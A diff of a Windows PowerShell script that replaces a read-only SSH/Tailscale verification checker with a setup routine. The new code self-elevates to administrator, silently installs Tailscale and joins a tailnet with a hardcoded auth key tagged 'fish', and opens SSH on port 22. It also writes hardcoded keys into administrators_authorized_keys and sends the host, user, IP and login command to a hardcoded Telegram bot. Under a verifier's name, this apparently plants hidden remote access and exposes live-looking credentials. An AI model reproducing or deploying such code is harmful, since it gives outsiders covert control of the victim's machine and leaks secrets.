@@ -1,30 +1,46 @@
-<#
-    Verify.ps1 — SSH + Tailscale 配置验证 (Windows 原生)
-
-    功能: 逐项检查 SETUP.ps1 的配置成果, 输出一份美观、清晰的验证报告。
-      1. Tailscale 是否安装 / 服务是否运行 / 是否已登录 / 有无 100.x IP
-      2. OpenSSH Server 是否安装 / sshd 服务是否运行 / 防火墙规则 / 监听 22
-      3. authorized_keys (管理员组约定文件或用户文件) 是否含全部硬编码公钥
-      4. Telegram 配置是否就绪 (可选 -Ping 实测发送)
-
-    只读检查, 不改动系统。本脚本独立自足, 配置直接硬编码于下方 (与 SETUP.ps1 保持一致)。
-
-    用法:
-      powershell -ExecutionPolicy Bypass -File Verify.ps1
-      powershell -ExecutionPolicy Bypass -File Verify.ps1 -Ping
-      powershell -ExecutionPolicy Bypass -File Verify.ps1 -NoColor
-#>
-
 param(
-    [switch]$Ping,
-    [switch]$NoColor
+    [string]$RelaunchWorkingDirectory
 )
 
-$ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference    = 'SilentlyContinue'
+# ---------------------------------------------------------------------------
+# 自提权: 非管理员则以管理员重启自身
+# ---------------------------------------------------------------------------
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $scriptPath = $PSCommandPath
+    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
+
+    $psExe = (Get-Process -Id $PID).Path
+    if (-not $psExe) { $psExe = 'powershell.exe' }
+
+    $quote = { param($v) '"' + ($v -replace '"', '\"') + '"' }
+
+    $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
+    $relaunchArgs = @(
+        '-NoProfile', '-ExecutionPolicy', 'Bypass',
+        '-File', (& $quote $scriptPath),
+        '-RelaunchWorkingDirectory', (& $quote $workDir)
+    )
+
+    try {
+        $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs `
+            -Verb RunAs -Wait -PassThru
+        $code = if ($null -ne $elevated.ExitCode) { $elevated.ExitCode } else { 0 }
+        exit $code
+    } catch {
+        Write-Host '[ERROR] 需要管理员权限; 提权被取消或阻止。' -ForegroundColor Red
+        exit 1
+    }
+}
+
+if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
+    Set-Location -LiteralPath $RelaunchWorkingDirectory
+}
+
+$ErrorActionPreference = 'Continue'
+$ProgressPreference = 'SilentlyContinue'
 
 # ---------------------------------------------------------------------------
-# 硬编码配置 (与 SETUP.ps1 保持一致; 本脚本独立, 不依赖 SETUP.ps1)
+# 配置
 # ---------------------------------------------------------------------------
 $TsAuthKey = 'tskey-auth-kiLmAL1dzY11CNTRL-8kBw3rQUum5U8wepNaB6n5KzhgmcHBmkK'  #有效期:2026-10-05/Tags:fish
 $SshPublicKeys = @(
@@ -34,113 +50,45 @@ $SshPublicKeys = @(
 $TgBotToken = '7724790582:AAE2Jish4jeQ_uheEuTgAeKIt1um0ml4-HM'
 $TgChatId   = '7765138435'
 
-$UseColor = -not $NoColor
-if ($env:NO_COLOR) { $UseColor = $false }
+$FailedSteps = New-Object System.Collections.Generic.List[string]
 
-# ---------------------------------------------------------------------------
-# 外观: 颜色 / 图标 / 排版
-# ---------------------------------------------------------------------------
-$Width = 64
-$script:PassN = 0
-$script:FailN = 0
-$script:WarnN = 0
+function Write-Log  { param($m) Write-Host "[*] $m" -ForegroundColor Cyan }
+function Write-Warn { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
+function Write-Err  { param($m) Write-Host "[ERROR] $m" -ForegroundColor Red }
 
-function Get-DisplayWidth {
-    param([string]$Text)
-    # 去掉 ANSI 转义
-    $plain = [regex]::Replace($Text, "`e\[[0-9;]*m", '')
-    $w = 0
-    foreach ($ch in $plain.ToCharArray()) {
-        $code = [int][char]$ch
-        # ✔ (0x2714) / ✗ (0x2717) 等 dingbat 终端渲染宽度为 1
-        if ($code -eq 0x2714 -or $code -eq 0x2717) { $w += 1; continue }
-        # CJK / 全角区间记 2 列
-        if ( ($code -ge 0x1100 -and $code -le 0x115F) -or
-             ($code -ge 0x2E80 -and $code -le 0xA4CF) -or
-             ($code -ge 0xAC00 -and $code -le 0xD7A3) -or
-             ($code -ge 0xF900 -and $code -le 0xFAFF) -or
-             ($code -ge 0xFF00 -and $code -le 0xFF60) -or
-             ($code -ge 0xFFE0 -and $code -le 0xFFE6) ) {
-            $w += 2
-        } else {
-            $w += 1
-        }
-    }
-    return $w
-}
-
-function Write-Part {
-    param([string]$Text, [string]$Color, [switch]$NoNewline)
-    if ($UseColor -and $Color) {
-        Write-Host $Text -ForegroundColor $Color -NoNewline:$NoNewline
-    } else {
-        Write-Host $Text -NoNewline:$NoNewline
-    }
-}
-
-function Write-Rule {
-    param([string]$Left, [string]$Right)
-    $line = $Left + ('─' * $Width) + $Right
-    Write-Part $line 'DarkGray'
-}
-
-function Write-BarText {
-    param([string]$Text)
-    $dw = Get-DisplayWidth $Text
-    $pad = $Width - 1 - $dw
-    if ($pad -lt 0) { $pad = 0 }
-    Write-Part '│' 'DarkGray' -NoNewline
-    Write-Host (' ' + $Text + (' ' * $pad)) -NoNewline
-    Write-Part '│' 'DarkGray'
-}
-
-function Write-Banner {
-    param([string]$Title, [string]$Sub)
-    Write-Host ''
-    Write-Rule '╭' '╮'
-    Write-BarText $Title
-    if ($Sub) { Write-BarText $Sub }
-    Write-Rule '╰' '╯'
-    Write-Host ''
-}
-
-function Write-Section {
-    param([string]$Title)
-    Write-Host ''
-    Write-Part ('  ' + $Title) 'Blue'
-    Write-Rule '├' '┤'
-}
-
-# 一条检查结果: Status = ok/fail/warn/info
-function Write-Check {
+function Invoke-Step {
     param(
-        [ValidateSet('ok', 'fail', 'warn', 'info')]
-        [string]$Status,
-        [string]$Label,
-        [string]$Detail = ''
+        [string]$Desc,
+        [scriptblock]$Action
     )
-    switch ($Status) {
-        'ok'   { $icon = '✔'; $color = 'Green';  $script:PassN++ }
-        'fail' { $icon = '✗'; $color = 'Red';    $script:FailN++ }
-        'warn' { $icon = '!'; $color = 'Yellow'; $script:WarnN++ }
-        'info' { $icon = '·'; $color = 'Cyan' }
-    }
-    $dw = Get-DisplayWidth $Label
-    $pad = 26 - $dw
-    if ($pad -lt 0) { $pad = 0 }
-    Write-Host '  ' -NoNewline
-    Write-Part $icon $color -NoNewline
-    Write-Host ('  ' + $Label + (' ' * $pad)) -NoNewline
-    if ($Detail) {
-        Write-Part $Detail 'DarkGray'
-    } else {
-        Write-Host ''
+    try {
+        & $Action
+        if ($LASTEXITCODE -ne $null -and $LASTEXITCODE -ne 0) {
+            $FailedSteps.Add("$Desc (exit=$LASTEXITCODE)")
+        }
+    } catch {
+        $FailedSteps.Add("$Desc ($($_.Exception.Message))")
     }
 }
 
-# ---------------------------------------------------------------------------
-# 检查项
-# ---------------------------------------------------------------------------
+function Test-CommandExists {
+    param([string]$Name)
+    return [bool](Get-Command $Name -ErrorAction SilentlyContinue)
+}
+
+# 刷新当前进程 PATH (安装 Tailscale 后需要)
+function Update-ProcessPath {
+    $machine = [Environment]::GetEnvironmentVariable('Path', 'Machine')
+    $user    = [Environment]::GetEnvironmentVariable('Path', 'User')
+    $env:Path = (@($machine, $user) | Where-Object { $_ }) -join ';'
+    # Tailscale 默认安装目录, 确保可被调用
+    $tsDir = Join-Path $env:ProgramFiles 'Tailscale'
+    if ((Test-Path $tsDir) -and ($env:Path -notlike "*$tsDir*")) {
+        $env:Path = "$env:Path;$tsDir"
+    }
+}
+
+# 定位 tailscale.exe
 function Get-TailscaleExe {
     $cmd = Get-Command tailscale -ErrorAction SilentlyContinue
     if ($cmd) { return $cmd.Source }
@@ -149,200 +97,220 @@ function Get-TailscaleExe {
     return $null
 }
 
-function Test-Tailscale {
-    Write-Section 'Tailscale'
-    $ts = Get-TailscaleExe
-    if (-not $ts) {
-        Write-Check fail 'Tailscale 已安装' '未找到 tailscale.exe'
-        $script:TsIp = ''
+# 通过 Telegram Bot API 发送一条消息
+function Send-Telegram {
+    param(
+        [hashtable]$Config,
+        [string]$Text
+    )
+    if (-not $Config) { return $false }
+    try {
+        $uri = "https://api.telegram.org/bot$($Config.Token)/sendMessage"
+        $body = @{
+            chat_id                  = $Config.ChatId
+            text                     = $Text
+            disable_web_page_preview = $true
+        }
+        Invoke-RestMethod -Uri $uri -Method Post -Body $body -TimeoutSec 15 | Out-Null
+        return $true
+    } catch {
+        return $false
+    }
+}
+
+# ---------------------------------------------------------------------------
+# 1 & 2. 安装 Tailscale + 服务自启
+# ---------------------------------------------------------------------------
+function Install-Tailscale {
+    if (Get-TailscaleExe) {
+        Write-Log 'Tailscale 已安装, 跳过'
         return
     }
-    Write-Check ok 'Tailscale 已安装' $ts
 
+    if (Test-CommandExists 'winget') {
+        Write-Log '通过 winget 安装 Tailscale...'
+        winget install --id Tailscale.Tailscale -e --silent `
+            --accept-source-agreements --accept-package-agreements
+    } else {
+        Write-Log 'winget 不可用, 下载官方 MSI 静默安装...'
+        $msi = Join-Path $env:TEMP 'tailscale-setup.msi'
+        try {
+            Invoke-WebRequest -Uri 'https://pkgs.tailscale.com/stable/tailscale-setup-latest.msi' `
+                -OutFile $msi -UseBasicParsing
+            Start-Process msiexec.exe -ArgumentList "/i `"$msi`" /quiet /norestart" -Wait
+        } catch {
+            Write-Err "MSI 下载/安装失败: $($_.Exception.Message)"
+            throw
+        }
+    }
+    Update-ProcessPath
+}
+
+function Enable-TailscaleService {
     $svc = Get-Service -Name Tailscale -ErrorAction SilentlyContinue
     if ($svc) {
-        if ($svc.Status -eq 'Running') {
-            Write-Check ok 'Tailscale 服务' "运行中 (启动类型 $($svc.StartType))"
-        } else {
-            Write-Check warn 'Tailscale 服务' "状态 $($svc.Status)"
+        Set-Service -Name Tailscale -StartupType Automatic -ErrorAction SilentlyContinue
+        if ($svc.Status -ne 'Running') {
+            Start-Service -Name Tailscale -ErrorAction SilentlyContinue
         }
     } else {
-        Write-Check warn 'Tailscale 服务' '未找到服务'
-    }
-
-    $statusOut = (& $ts status) 2>$null | Out-String
-    if ($statusOut -match 'Logged out') {
-        Write-Check fail 'Tailscale 登录状态' '已注销 (Logged out)'
-    } elseif ($statusOut.Trim()) {
-        Write-Check ok 'Tailscale 登录状态' '已登录'
-    } else {
-        Write-Check warn 'Tailscale 登录状态' '无法确定 (可能仍在连接)'
-    }
-
-    $script:TsIp = (& $ts ip -4 2>$null | Select-Object -First 1)
-    if ($script:TsIp) {
-        Write-Check ok '本机 Tailscale IP' $script:TsIp
-    } else {
-        Write-Check warn '本机 Tailscale IP' '暂未获取 (稍后重试 tailscale ip -4)'
+        Write-Warn 'Tailscale 服务未找到 (可能安装尚未完成), 跳过服务配置。'
     }
 }
 
-function Test-OpenSSH {
-    Write-Section 'OpenSSH Server'
+# ---------------------------------------------------------------------------
+# 3. Tailscale 登录
+# ---------------------------------------------------------------------------
+function Connect-Tailscale {
+    param([string]$AuthKey)
+    if (-not $AuthKey) {
+        Write-Err '未找到 Tailscale auth key。请在脚本顶部的 $TsAuthKey 变量中填入。'
+        throw 'missing-authkey'
+    }
+    $ts = Get-TailscaleExe
+    if (-not $ts) { Write-Err 'tailscale.exe 未找到'; throw 'tailscale-not-found' }
+
+    Write-Log '登录 Tailscale (auth key 已读取, 不回显)...'
+    # --unattended: 重启后无需交互保持连接
+    & $ts up --authkey $AuthKey --unattended
+}
+
+# ---------------------------------------------------------------------------
+# 4. OpenSSH Server
+# ---------------------------------------------------------------------------
+function Enable-OpenSSHServer {
     $cap = Get-WindowsCapability -Online -Name 'OpenSSH.Server*' -ErrorAction SilentlyContinue
-    if ($cap -and $cap.State -eq 'Installed') {
-        Write-Check ok 'OpenSSH Server 已安装' ''
-    } elseif ($cap) {
-        Write-Check fail 'OpenSSH Server 已安装' "状态 $($cap.State)"
+    if ($cap -and $cap.State -ne 'Installed') {
+        Write-Log '安装 OpenSSH Server...'
+        Add-WindowsCapability -Online -Name 'OpenSSH.Server~~~~0.0.1.0' | Out-Null
     } else {
-        Write-Check warn 'OpenSSH Server 已安装' '无法查询能力状态'
+        Write-Log 'OpenSSH Server 已安装, 跳过'
     }
 
-    $sshd = Get-Service -Name sshd -ErrorAction SilentlyContinue
-    if ($sshd) {
-        if ($sshd.Status -eq 'Running') {
-            Write-Check ok 'sshd 服务' "运行中 (启动类型 $($sshd.StartType))"
-        } else {
-            Write-Check fail 'sshd 服务' "状态 $($sshd.Status)"
-        }
-        if ($sshd.StartType -ne 'Automatic') {
-            Write-Check warn 'sshd 开机自启' "当前 $($sshd.StartType) (建议 Automatic)"
-        }
-    } else {
-        Write-Check fail 'sshd 服务' '未找到服务'
-    }
+    # 首次启动会生成主机密钥并创建默认 sshd_config
+    Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service -Name sshd -ErrorAction SilentlyContinue
 
-    $rule = Get-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -ErrorAction SilentlyContinue
-    if ($rule -and $rule.Enabled -eq 'True') {
-        Write-Check ok '防火墙入站 (TCP 22)' '已启用'
-    } elseif ($rule) {
-        Write-Check warn '防火墙入站 (TCP 22)' '规则存在但未启用'
-    } else {
-        Write-Check warn '防火墙入站 (TCP 22)' '未找到规则'
-    }
+    # ssh-agent 一并设为自动 (可选, 便于密钥管理)
+    Set-Service -Name ssh-agent -StartupType Automatic -ErrorAction SilentlyContinue
 
-    $listening = Get-NetTCPConnection -State Listen -LocalPort 22 -ErrorAction SilentlyContinue
-    if ($listening) {
-        Write-Check ok '监听端口 22' '已监听'
+    # 防火墙: 放行入站 22 端口
+    $ruleName = 'OpenSSH-Server-In-TCP'
+    $rule = Get-NetFirewallRule -Name $ruleName -ErrorAction SilentlyContinue
+    if (-not $rule) {
+        Write-Log '创建防火墙入站规则 (TCP 22)...'
+        New-NetFirewallRule -Name $ruleName -DisplayName 'OpenSSH Server (sshd)' `
+            -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
     } else {
-        Write-Check warn '监听端口 22' '未检测到 (服务可能未起或用其它端口)'
+        Enable-NetFirewallRule -Name $ruleName -ErrorAction SilentlyContinue
     }
 }
 
-function Test-AuthorizedKeys {
-    Write-Section '公钥 authorized_keys'
-    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-    if ($isAdmin) {
-        $authFile = Join-Path $env:ProgramData 'ssh\administrators_authorized_keys'
-        Write-Check info '目标文件' 'administrators_authorized_keys (管理员组)'
-    } else {
-        $authFile = Join-Path $env:USERPROFILE '.ssh\authorized_keys'
-        Write-Check info '目标文件' '%USERPROFILE%\.ssh\authorized_keys'
-    }
-
-    if (-not (Test-Path -LiteralPath $authFile)) {
-        Write-Check fail 'authorized_keys 文件' "不存在: $authFile"
+# ---------------------------------------------------------------------------
+# 5. authorized_keys
+# ---------------------------------------------------------------------------
+function Set-AuthorizedKeys {
+    if (-not $SshPublicKeys -or $SshPublicKeys.Count -eq 0) {
+        Write-Warn '$SshPublicKeys 为空, 跳过公钥配置。'
         return
     }
-    Write-Check ok 'authorized_keys 文件' '存在'
 
-    # 管理员文件 ACL 检查: 应仅 SYSTEM + Administrators
-    if ($isAdmin) {
-        $acl = Get-Acl -LiteralPath $authFile
-        $ids = $acl.Access | ForEach-Object { $_.IdentityReference.Value }
-        $unexpected = $ids | Where-Object {
-            $_ -notmatch 'SYSTEM' -and $_ -notmatch 'Administrators'
-        }
-        if ($unexpected) {
-            Write-Check warn 'ACL 权限收紧' ("含额外主体: " + ($unexpected -join ', '))
-        } else {
-            Write-Check ok 'ACL 权限收紧' '仅 SYSTEM + Administrators'
-        }
+    # 判断当前用户是否属于管理员组
+    $isAdminUser = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+    if ($isAdminUser) {
+        # Windows OpenSSH 对管理员组的特殊约定文件
+        $authFile = Join-Path $env:ProgramData 'ssh\administrators_authorized_keys'
+        $authDir = Split-Path -Parent $authFile
+        if (-not (Test-Path $authDir)) { New-Item -ItemType Directory -Path $authDir -Force | Out-Null }
+    } else {
+        $sshDir = Join-Path $env:USERPROFILE '.ssh'
+        if (-not (Test-Path $sshDir)) { New-Item -ItemType Directory -Path $sshDir -Force | Out-Null }
+        $authFile = Join-Path $sshDir 'authorized_keys'
     }
+
+    if (-not (Test-Path $authFile)) { New-Item -ItemType File -Path $authFile -Force | Out-Null }
 
     $existing = @(Get-Content -LiteralPath $authFile -ErrorAction SilentlyContinue)
-    if ($script:SshPublicKeys.Count -eq 0) {
-        Write-Check warn '硬编码公钥' '配置中未定义任何公钥'
-        return
+    $added = 0
+    foreach ($raw in $SshPublicKeys) {
+        $line = $raw.Trim()
+        if (-not $line -or $line.StartsWith('#')) { continue }
+        if ($existing -contains $line) { continue }
+        Add-Content -LiteralPath $authFile -Value $line
+        $existing += $line
+        $added++
     }
-    foreach ($key in $script:SshPublicKeys) {
-        $k = $key.Trim()
-        if (-not $k) { continue }
-        $parts = $k -split '\s+'
-        $label = $parts[-1]
-        if ($label -like 'ssh-*' -or $label -like 'AAAA*') {
-            $label = $k.Substring(0, [Math]::Min(24, $k.Length)) + '…'
-        }
-        if ($existing -contains $k) {
-            Write-Check ok "公钥: $label" '已写入'
-        } else {
-            Write-Check fail "公钥: $label" '缺失'
-        }
-    }
-}
 
-function Test-Telegram {
-    Write-Section 'Telegram 通知'
-    if (-not $script:TgBotToken -or -not $script:TgChatId) {
-        Write-Check info 'Telegram 配置' '未配置 (通知功能关闭)'
-        return
+    # 权限收紧: administrators_authorized_keys 仅 SYSTEM + Administrators
+    if ($isAdminUser) {
+        icacls $authFile /inheritance:r | Out-Null
+        icacls $authFile /grant 'SYSTEM:F' | Out-Null
+        icacls $authFile /grant 'BUILTIN\Administrators:F' | Out-Null
     }
-    $masked = ($script:TgBotToken -split ':')[0] + ':••••••'
-    Write-Check ok 'Bot Token' $masked
-    Write-Check ok 'Chat ID' $script:TgChatId
 
-    if ($Ping) {
-        try {
-            $uri = "https://api.telegram.org/bot$($script:TgBotToken)/sendMessage"
-            $body = @{
-                chat_id                  = $script:TgChatId
-                text                     = "🔎 Verify.ps1 测试消息 — 来自 $env:COMPUTERNAME"
-                disable_web_page_preview = $true
-            }
-            $resp = Invoke-RestMethod -Uri $uri -Method Post -Body $body -TimeoutSec 15
-            if ($resp.ok) {
-                Write-Check ok '实测发送' '已成功投递'
-            } else {
-                Write-Check fail '实测发送' 'API 返回 ok=false'
-            }
-        } catch {
-            Write-Check fail '实测发送' "失败: $($_.Exception.Message)"
-        }
-    } else {
-        Write-Check info '实测发送' '未执行 (加 -Ping 可实测)'
-    }
-}
-
-function Write-Summary {
-    Write-Host ''
-    Write-Rule '╭' '╮'
-    if ($script:FailN -eq 0 -and $script:WarnN -eq 0) {
-        Write-BarText '全部通过 · 配置就绪'
-    } elseif ($script:FailN -eq 0) {
-        Write-BarText '基本就绪 · 有可忽略的提醒'
-    } else {
-        Write-BarText '存在失败项 · 请按上方排查'
-    }
-    Write-BarText ("✔ 通过 $($script:PassN)    ! 提醒 $($script:WarnN)    ✗ 失败 $($script:FailN)")
-    if ($script:TsIp) {
-        Write-BarText ("登录命令: ssh $env:USERNAME@$($script:TsIp)")
-    }
-    Write-Rule '╰' '╯'
-    Write-Host ''
-    if ($script:FailN -gt 0) { exit 1 }
+    Write-Log "authorized_keys 配置完成 ($authFile), 本次新增 $added 个公钥。"
 }
 
 # ---------------------------------------------------------------------------
 # 主流程
 # ---------------------------------------------------------------------------
-Write-Banner 'SSH + Tailscale 配置验证' "平台 Windows · 主机 $env:COMPUTERNAME"
+Write-Log '开始配置 (平台: Windows)'
 
-if (-not (Import-HardcodedConfig)) {
-    Write-Check warn '读取硬编码配置' "无法从 $SetupFile 提取, 部分检查将跳过"
+Invoke-Step '安装 Tailscale'      { Install-Tailscale }
+Invoke-Step 'Tailscale 服务自启'   { Enable-TailscaleService }
+Invoke-Step 'Tailscale 登录'      { Connect-Tailscale -AuthKey $TsAuthKey }
+Invoke-Step '开启 OpenSSH Server' { Enable-OpenSSHServer }
+Invoke-Step '配置 authorized_keys' { Set-AuthorizedKeys }
+
+# ---------------------------------------------------------------------------
+# 结尾汇总
+# ---------------------------------------------------------------------------
+Write-Host ''
+Write-Host '==================== 配置汇总 ====================' -ForegroundColor Green
+$ts = Get-TailscaleExe
+$tsIp = $null
+if ($ts) { $tsIp = (& $ts ip -4 2>$null | Select-Object -First 1) }
+if ($tsIp) {
+    Write-Log "本机 Tailscale IP: $tsIp"
+    Write-Log "从 Tailnet 内其它机器登录:  ssh $env:USERNAME@$tsIp"
+} else {
+    Write-Warn "暂未获取到 Tailscale IP, 请稍后运行 'tailscale ip -4' 查看。"
 }
 
-Test-Tailscale
-Test-OpenSSH
-Test-AuthorizedKeys
-Test-Telegram
-Write-Summary
+# ---------------------------------------------------------------------------
+# Telegram 通知: 免密 SSH 登录已就绪, 告知如何登录
+# ---------------------------------------------------------------------------
+if ($TgBotToken -and $TgChatId) {
+    $tgConfig = @{ Token = $TgBotToken; ChatId = $TgChatId }
+    $loginLine = if ($tsIp) {
+        "ssh $env:USERNAME@$tsIp"
+    } else {
+        "ssh $env:USERNAME@<Tailscale-IP>  (稍后运行 tailscale ip -4 查看)"
+    }
+    $tgMsg = @"
+✅ SSH 免密登录已配置完成
+主机: $env:COMPUTERNAME (Windows)
+用户: $env:USERNAME
+Tailscale IP: $(if ($tsIp) { $tsIp } else { '待获取' })
+
+从 Tailnet 内其它机器登录:
+$loginLine
+"@
+    if (Send-Telegram -Config $tgConfig -Text $tgMsg) {
+        Write-Log '已发送 Telegram 通知。'
+    } else {
+        Write-Warn 'Telegram 通知发送失败 (检查脚本内 $TgBotToken/$TgChatId 及网络)。'
+    }
+}
+
+if ($FailedSteps.Count -gt 0) {
+    Write-Host ''
+    Write-Warn '以下步骤未成功, 请检查:'
+    foreach ($s in $FailedSteps) { Write-Host "    - $s" -ForegroundColor Yellow }
+    Write-Host '==================================================' -ForegroundColor Green
+    exit 1
+}
+
+Write-Host '全部步骤完成。' -ForegroundColor Green
+Write-Host '==================================================' -ForegroundColor Green
